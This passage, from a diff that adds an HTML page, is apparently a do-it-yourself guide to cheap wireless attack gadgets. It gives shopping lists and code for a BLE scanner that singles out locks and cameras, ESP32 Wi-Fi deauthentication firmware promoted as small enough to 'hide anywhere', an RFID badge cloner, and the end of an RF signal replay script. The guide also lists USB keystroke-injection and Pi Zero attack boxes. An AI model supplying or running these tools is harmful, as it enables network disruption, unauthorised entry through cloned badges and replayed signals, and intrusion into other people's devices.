+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">with</span> <span class="c-fn">open</span>(filename, <span class="c-str">"w"</span>) <span class="c-kw">as</span> f:<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json.<span class="c-fn">dump</span>(self.signals, f, indent=<span class="c-num">2</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"[+] Saved {len(self.signals)} signals to {filename}"</span>)<br><br>
+        <span class="c-comment"># Usage</span><br>
+        rf = <span class="c-fn">RFCapture</span>()<br>
+        sigs = rf.<span class="c-fn">capture</span>(duration=<span class="c-num">15</span>)<br>
+        <span class="c-kw">if</span> sigs:<br>
+        &nbsp;&nbsp;rf.<span class="c-fn">save</span>()<br>
+        &nbsp;&nbsp;rf.<span class="c-fn">replay</span>(sigs[<span class="c-num">0</span>])
+      </div>
+    </div>
+  </div>
+
+  <!-- BLE -->
+  <div class="detail-panel" id="detail-ble" style="--panel-color:#69f0ae">
+    <div class="detail-header" style="border-left: 4px solid #69f0ae">
+      <span style="font-size:24px">🔵</span>
+      <div class="detail-title" style="color:#69f0ae">CUSTOM BLE SCANNER</div>
+      <div class="detail-close" onclick="closeDetail('ble')">✕ CLOSE</div>
+    </div>
+    <div class="detail-body">
+      <div class="detail-cols">
+        <div>
+          <div class="section-label">// REQUIREMENTS</div>
+          <div class="shopping-list">
+            <div class="shop-item"><span class="shop-name">Your laptop Bluetooth</span><span class="shop-price">Already have it</span></div>
+            <div class="shop-item"><span class="shop-name">Python 3.x</span><span class="shop-price">Free</span></div>
+            <div class="shop-item"><span class="shop-name">bleak library (pip)</span><span class="shop-price">Free</span></div>
+            <div class="shop-total"><span>TOTAL COST</span><span>$0</span></div>
+          </div>
+          <div class="alert-tip" style="margin-top:14px">
+            <div class="alert-tip-icon">✓</div>
+            <div>This is your <strong>first custom wireless tool</strong> to build — zero hardware cost, runs right now on your machine.</div>
+          </div>
+        </div>
+        <div>
+          <div class="section-label">// WHAT YOU CAN FIND</div>
+          <div class="step-list">
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(105,240,174,0.3);background:rgba(105,240,174,0.08);color:#69f0ae">▸</div>
+              <div class="step-text">Smart locks broadcasting their presence</div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(105,240,174,0.3);background:rgba(105,240,174,0.08);color:#69f0ae">▸</div>
+              <div class="step-text">IoT sensors with no authentication</div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(105,240,174,0.3);background:rgba(105,240,174,0.08);color:#69f0ae">▸</div>
+              <div class="step-text">Fitness bands leaking health data</div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(105,240,174,0.3);background:rgba(105,240,174,0.08);color:#69f0ae">▸</div>
+              <div class="step-text">Cheap BLE cameras with default PINs</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="section-label">// CUSTOM BLE HUNTER SCRIPT</div>
+      <div class="code-block" style="--panel-color:#69f0ae">
+        <span class="c-comment">#!/usr/bin/env python3</span><br>
+        <span class="c-comment"># pip install bleak</span><br>
+        <span class="c-comment"># Custom BLE device scanner + GATT enumerator</span><br><br>
+        <span class="c-kw">import</span> asyncio<br>
+        <span class="c-kw">from</span> bleak <span class="c-kw">import</span> BleakScanner, BleakClient<br><br>
+        <span class="c-comment"># Known vulnerable device patterns</span><br>
+        TARGETS = [<span class="c-str">"Lock"</span>, <span class="c-str">"Cam"</span>, <span class="c-str">"Sensor"</span>, <span class="c-str">"Door"</span>, <span class="c-str">"Gate"</span>]<br><br>
+        <span class="c-kw">async def</span> <span class="c-fn">scan_and_hunt</span>():<br>
+        &nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">"[*] Scanning for BLE devices..."</span>)<br>
+        &nbsp;&nbsp;devices = <span class="c-kw">await</span> BleakScanner.<span class="c-fn">discover</span>(timeout=<span class="c-num">10</span>)<br><br>
+        &nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"\n[+] Found {len(devices)} devices:\n"</span>)<br>
+        &nbsp;&nbsp;<span class="c-kw">for</span> d <span class="c-kw">in</span> <span class="c-fn">sorted</span>(devices, key=<span class="c-kw">lambda</span> x: x.rssi, reverse=<span class="c-kw">True</span>):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;name = d.name <span class="c-kw">or</span> <span class="c-str">"Unknown"</span><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;flag = <span class="c-str">" ← INTERESTING"</span> <span class="c-kw">if any</span>(t.lower() <span class="c-kw">in</span> name.lower() <span class="c-kw">for</span> t <span class="c-kw">in</span> TARGETS) <span class="c-kw">else</span> <span class="c-str">""</span><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"  {d.rssi:4}dBm | {d.address} | {name}{flag}"</span>)<br><br>
+        <span class="c-kw">async def</span> <span class="c-fn">enumerate_device</span>(address):<br>
+        &nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"\n[*] Connecting to {address}..."</span>)<br>
+        &nbsp;&nbsp;<span class="c-kw">async with</span> <span class="c-fn">BleakClient</span>(address) <span class="c-kw">as</span> client:<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"[+] Connected! Dumping GATT services:\n"</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">for</span> svc <span class="c-kw">in</span> client.services:<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"  SERVICE: {svc.uuid}"</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">for</span> char <span class="c-kw">in</span> svc.characteristics:<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"    CHAR: {char.uuid} | props: {char.properties}"</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">if</span> <span class="c-str">"read"</span> <span class="c-kw">in</span> char.properties:<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">try</span>:<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;val = <span class="c-kw">await</span> client.<span class="c-fn">read_gatt_char</span>(char.uuid)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"    VALUE: {val.hex()} | {val}"</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">except</span>: <span class="c-kw">pass</span><br><br>
+        asyncio.<span class="c-fn">run</span>(<span class="c-fn">scan_and_hunt</span>())
+      </div>
+    </div>
+  </div>
+
+  <!-- ESP32 -->
+  <div class="detail-panel" id="detail-esp32" style="--panel-color:#ffee58">
+    <div class="detail-header" style="border-left: 4px solid #ffee58">
+      <span style="font-size:24px">⚡</span>
+      <div class="detail-title" style="color:#ffee58">ESP32 WIFI DEAUTHER</div>
+      <div class="detail-close" onclick="closeDetail('esp32')">✕ CLOSE</div>
+    </div>
+    <div class="detail-body">
+      <div class="detail-cols">
+        <div>
+          <div class="section-label">// SHOPPING LIST</div>
+          <div class="shopping-list">
+            <div class="shop-item"><span class="shop-name">ESP32 dev board</span><span class="shop-price">~$3–5</span></div>
+            <div class="shop-item"><span class="shop-name">USB cable (micro)</span><span class="shop-price">~$1</span></div>
+            <div class="shop-item"><span class="shop-name">Arduino IDE + ESP32 board</span><span class="shop-price">Free</span></div>
+            <div class="shop-total"><span>TOTAL BUILD COST</span><span>~$4–6</span></div>
+          </div>
+        </div>
+        <div>
+          <div class="section-label">// WHY ESP32 IS PERFECT</div>
+          <div class="step-list">
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(255,238,88,0.3);background:rgba(255,238,88,0.08);color:#ffee58">▸</div>
+              <div class="step-text">Built-in <strong>WiFi + Bluetooth</strong> — dual attack capability</div>
+              </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(255,238,88,0.3);background:rgba(255,238,88,0.08);color:#ffee58">▸</div>
+              <div class="step-text">Runs standalone — <strong>no laptop needed</strong> in the field</div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(255,238,88,0.3);background:rgba(255,238,88,0.08);color:#ffee58">▸</div>
+              <div class="step-text">Can host a <strong>web UI</strong> — control from your phone browser</div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(255,238,88,0.3);background:rgba(255,238,88,0.08);color:#ffee58">▸</div>
+              <div class="step-text">Smaller than a thumb. <strong>Hide anywhere.</strong></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="section-label">// ESP32 DEAUTH CORE LOGIC (C++ / Arduino)</div>
+      <div class="code-block" style="--panel-color:#ffee58">
+        <span class="c-comment">// Flash onto ESP32 via Arduino IDE</span><br>
+        <span class="c-comment">// Scans networks, serves web UI, sends deauth frames</span><br><br>
+        <span class="c-kw">#include</span> <span class="c-str">"WiFi.h"</span><br>
+        <span class="c-kw">#include</span> <span class="c-str">"esp_wifi.h"</span><br>
+        <span class="c-kw">#include</span> <span class="c-str">"WebServer.h"</span><br><br>
+        WebServer <span class="c-fn">server</span>(<span class="c-num">80</span>);<br>
+        uint8_t deauth_frame[<span class="c-num">26</span>] = {<br>
+        &nbsp;&nbsp;<span class="c-num">0xC0</span>, <span class="c-num">0x00</span>,           <span class="c-comment">// type: deauth frame</span><br>
+        &nbsp;&nbsp;<span class="c-num">0x00</span>, <span class="c-num">0x00</span>,           <span class="c-comment">// duration</span><br>
+        &nbsp;&nbsp;<span class="c-num">0xFF</span>, <span class="c-num">0xFF</span>, <span class="c-num">0xFF</span>, <span class="c-num">0xFF</span>, <span class="c-num">0xFF</span>, <span class="c-num">0xFF</span>,  <span class="c-comment">// destination: broadcast</span><br>
+        &nbsp;&nbsp;<span class="c-comment">// ... source + BSSID filled at runtime</span><br>
+        };<br><br>
+        <span class="c-kw">void</span> <span class="c-fn">sendDeauth</span>(uint8_t* bssid, uint8_t channel) {<br>
+        &nbsp;&nbsp;esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);<br>
+        &nbsp;&nbsp;<span class="c-comment">// Copy target BSSID into frame</span><br>
+        &nbsp;&nbsp;<span class="c-fn">memcpy</span>(&amp;deauth_frame[<span class="c-num">10</span>], bssid, <span class="c-num">6</span>);<br>
+        &nbsp;&nbsp;<span class="c-fn">memcpy</span>(&amp;deauth_frame[<span class="c-num">16</span>], bssid, <span class="c-num">6</span>);<br>
+        &nbsp;&nbsp;<span class="c-kw">for</span> (<span class="c-kw">int</span> i = <span class="c-num">0</span>; i &lt; <span class="c-num">10</span>; i++) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, <span class="c-kw">sizeof</span>(deauth_frame), <span class="c-kw">false</span>);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">delay</span>(<span class="c-num">5</span>);<br>
+        &nbsp;&nbsp;}<br>
+        }<br><br>
+        <span class="c-kw">void</span> <span class="c-fn">setup</span>() {<br>
+        &nbsp;&nbsp;WiFi.<span class="c-fn">mode</span>(WIFI_STA);<br>
+        &nbsp;&nbsp;esp_wifi_set_promiscuous(<span class="c-kw">true</span>);<br>
+        &nbsp;&nbsp;<span class="c-comment">// Start web UI on 192.168.4.1</span><br>
+        &nbsp;&nbsp;server.<span class="c-fn">on</span>(<span class="c-str">"/"</span>, handleRoot);<br>
+        &nbsp;&nbsp;server.<span class="c-fn">begin</span>();<br>
+        }
+      </div>
+    </div>
+  </div>
+
+  <!-- RFID -->
+  <div class="detail-panel" id="detail-rfid" style="--panel-color:#ff5252">
+    <div class="detail-header" style="border-left: 4px solid #ff5252">
+      <span style="font-size:24px">💳</span>
+      <div class="detail-title" style="color:#ff5252">DIY RFID CLONER</div>
+      <div class="detail-close" onclick="closeDetail('rfid')">✕ CLOSE</div>
+    </div>
+    <div class="detail-body">
+      <div class="detail-cols">
+        <div>
+          <div class="section-label">// SHOPPING LIST</div>
+          <div class="shopping-list">
+            <div class="shop-item"><span class="shop-name">MFRC522 RFID module</span><span class="shop-price">~$2–3</span></div>
+            <div class="shop-item"><span class="shop-name">Arduino Uno / Nano</span><span class="shop-price">~$3–5</span></div>
+            <div class="shop-item"><span class="shop-name">Blank RFID cards (T5577)</span><span class="shop-price">~$3 for 5</span></div>
+            <div class="shop-item"><span class="shop-name">Jumper wires</span><span class="shop-price">~$1</span></div>
+            <div class="shop-total"><span>TOTAL BUILD COST</span><span>~$9–12</span></div>
+          </div>
+        </div>
+        <div>
+          <div class="section-label">// WIRING (SPI)</div>
+          <div class="code-block" style="--panel-color:#ff5252; font-size:11px;">
+            MFRC522 → Arduino Nano<br>
+            <span class="c-str">SDA  </span>→ <span class="c-out">D10 (SS)</span><br>
+            <span class="c-str">SCK  </span>→ <span class="c-out">D13</span><br>
+            <span class="c-str">MOSI </span>→ <span class="c-out">D11</span><br>
+            <span class="c-str">MISO </span>→ <span class="c-out">D12</span><br>
+            <span class="c-str">RST  </span>→ <span class="c-out">D9</span><br>
+            <span class="c-str">3.3V </span>→ <span class="c-out">3.3V</span><br>
+            <span class="c-str">GND  </span>→ <span class="c-out">GND</span>
+          </div>
+        </div>
+      </div>
+      <div class="section-label">// PYTHON RFID READ + CLONE SCRIPT</div>
+      <div class="code-block" style="--panel-color:#ff5252">
+        <span class="c-comment">#!/usr/bin/env python3</span><br>
+        <span class="c-comment"># pip install mfrc522 RPi.GPIO (for Raspberry Pi)</span><br>
+        <span class="c-comment"># or use pyserial to talk to Arduino sketch</span><br><br>
+        <span class="c-kw">import</span> serial, time<br><br>
+        <span class="c-kw">class</span> <span class="c-fn">RFIDCloner</span>:<br>
+        &nbsp;&nbsp;<span class="c-kw">def</span> <span class="c-fn">__init__</span>(self, port=<span class="c-str">"/dev/ttyUSB0"</span>):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;self.ser = serial.<span class="c-fn">Serial</span>(port, <span class="c-num">9600</span>, timeout=<span class="c-num">5</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;self.captured_uid = <span class="c-kw">None</span><br><br>
+        &nbsp;&nbsp;<span class="c-kw">def</span> <span class="c-fn">read_card</span>(self):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">"[*] Hold card near reader..."</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;self.ser.<span class="c-fn">write</span>(<span class="c-str">b"READ\n"</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;response = self.ser.readline().<span class="c-fn">decode</span>().<span class="c-fn">strip</span>()<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">if</span> response.<span class="c-fn">startswith</span>(<span class="c-str">"UID:"</span>):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.captured_uid = response[<span class="c-num">4</span>:]<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"[+] Card UID: {self.captured_uid}"</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">return</span> self.captured_uid<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">return</span> <span class="c-kw">None</span><br><br>
+        &nbsp;&nbsp;<span class="c-kw">def</span> <span class="c-fn">clone_to_blank</span>(self):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">if not</span> self.captured_uid:<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">"[-] No card captured yet. Run read_card() first."</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">return</span><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">"[*] Now hold blank T5577 card near reader..."</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;self.ser.<span class="c-fn">write</span>(<span class="c-str">f"WRITE:{self.captured_uid}\n"</span>.<span class="c-fn">encode</span>())<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;result = self.ser.readline().<span class="c-fn">decode</span>().<span class="c-fn">strip</span>()<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"[+] Clone result: {result}"</span>)<br><br>
+        <span class="c-comment"># Usage</span><br>
+        cloner = <span class="c-fn">RFIDCloner</span>()<br>
+        cloner.<span class="c-fn">read_card</span>()<br>
+        cloner.<span class="c-fn">clone_to_blank</span>()
+      </div>
+      <div class="alert-tip">
+        <div class="alert-tip-icon">✓ TIP</div>
+        <div>T5577 blank cards are <strong>writable RFID cards</strong> that can emulate both 125kHz (EM4100, HID Prox) and some 13.56MHz formats. Grab 5–10 of them — super cheap on Lazada.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Comparison section -->
+  <div style="margin-top:8px;">
+    <div class="section-label">// QUICK COMPARISON — ALL TOOLS</div>
+    <table class="compare-table">
+      <tr>
+        <th>TOOL</th>
+        <th>COST</th>
+        <th>HARDWARE NEEDED</th>
+        <th>LANGUAGE</th>
+        <th>DIFFICULTY</th>
+        <th>START NOW?</th>
+      </tr>
+      <tr>
+        <td style="color:#69f0ae;font-weight:600">BLE Scanner</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#69f0ae">$0</td>
+        <td style="color:var(--muted);font-size:13px">Your laptop</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#4fc3f7">Python</td>
+        <td><span style="color:#69f0ae;font-family:'JetBrains Mono',monospace;font-size:10px">EASY</span></td>
+        <td style="color:#69f0ae;font-size:13px">✓ Yes, today</td>
+      </tr>
+      <tr>
+        <td style="color:#ff7043;font-weight:600">USB Rubber Ducky</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#69f0ae">~$4</td>
+        <td style="color:var(--muted);font-size:13px">Digispark</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#4fc3f7">Arduino C</td>
+        <td><span style="color:#69f0ae;font-family:'JetBrains Mono',monospace;font-size:10px">EASY</span></td>
+        <td style="color:#ffee58;font-size:13px">Need Digispark</td>
+      </tr>
+      <tr>
+        <td style="color:#ce93d8;font-weight:600">RF 433 Replay</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#69f0ae">~$8</td>
+        <td style="color:var(--muted);font-size:13px">Arduino + RF module</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#4fc3f7">Python + C</td>
+        <td><span style="color:#69f0ae;font-family:'JetBrains Mono',monospace;font-size:10px">EASY</span></td>
+        <td style="color:#ffee58;font-size:13px">Need RF module</td>
+      </tr>
+      <tr>
+        <td style="color:#ff5252;font-weight:600">RFID Cloner</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#69f0ae">~$10</td>
+        <td style="color:var(--muted);font-size:13px">MFRC522 + Arduino</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#4fc3f7">Python</td>
+        <td><span style="color:#69f0ae;font-family:'JetBrains Mono',monospace;font-size:10px">EASY</span></td>
+        <td style="color:#ffee58;font-size:13px">Need MFRC522</td>
+      </tr>
+      <tr>
+        <td style="color:#ffee58;font-weight:600">ESP32 Deauther</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#69f0ae">~$5</td>
+        <td style="color:var(--muted);font-size:13px">ESP32</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#4fc3f7">C++ Arduino</td>
+        <td><span style="color:#ffee58;font-family:'JetBrains Mono',monospace;font-size:10px">MEDIUM</span></td>
+        <td style="color:#ffee58;font-size:13px">Need ESP32</td>
+      </tr>
+      <tr>
+        <td style="color:#4fc3f7;font-weight:600">Pi Zero Attack Box</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#ffee58">~$33</td>
+        <td style="color:var(--muted);font-size:13px">Pi Zero 2W</td>
+        <td style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#4fc3f7">Python + Bash</td>
+        <td><span style="color:#ffee58;font-family:'JetBrains Mono',monospace;font-size:10px">MEDIUM</span></td>
+        <td style="color:#ff7043;font-size:13px">Need Pi Zero</td>
+      </tr>
+    </table>
+  </div>
+
+</div>
+
+<script>
+function showDetail(id) {
+  document.querySelectorAll('.detail-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tool-card').forEach(c => c.classList.remove('selected'));
+  const panel = document.getElementById('detail-' + id);
+  const cards = document.querySelectorAll('.tool-card');
+  cards.forEach(c => { if (c.getAttribute('onclick').includes(id)) c.classList.add('selected'); });
+  panel.classList.add('active');
+  panel.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+function closeDetail(id) {
+  document.getElementById('detail-' + id).classList.remove('active');
+  document.querySelectorAll('.tool-card').forEach(c => c.classList.remove('selected'));
+}
+</script>
+</body>
+</html>
